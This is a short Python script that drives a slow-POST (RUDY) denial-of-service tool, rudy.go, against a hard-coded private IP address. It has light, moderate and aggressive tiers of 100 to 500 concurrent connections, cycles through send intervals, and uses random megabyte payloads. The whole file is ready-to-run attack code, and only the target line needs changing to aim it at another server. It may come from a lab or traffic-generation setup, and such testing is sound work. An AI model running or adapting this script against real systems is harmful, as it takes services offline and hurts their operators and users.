
import sys
import subprocess
import random

TARGET_URL = "http://192.168.100.122"

def main():
	if len(sys.argv) != 2:
		print("Usage: python3 slowpostattacknew.py <category>")
		print("category: light | moderate | aggresive")
		sys.exit(1)
	category = sys.argv[1].lower()
	configs = {
		"light":    {"connection": 100},
		"moderate": {"connection": 300},
		"aggresive": {"connection": 500},
	}
	intervals = [5, 10, 15]
	runtime = 60
	if category not in configs:
		print("Invalid category. Use: light | moderate | aggresive")
		sys.exit(1)
	connection = configs[category]["connection"]
	for interval in intervals:
		payload_mb = random.randint(1, 5)
		payload = f"{payload_mb}MB"
		cmd = [
			"timeout", str(runtime),
			"go", "run", "rudy.go", "run",
			"-u", TARGET_URL,
			"-i", f"{interval}s",
			"-p", payload,
			"-c", str(connection)
		]
		print(f"[INFO] Running: {' '.join(cmd)}")
		subprocess.run(cmd)

if __name__ == "__main__":
	main()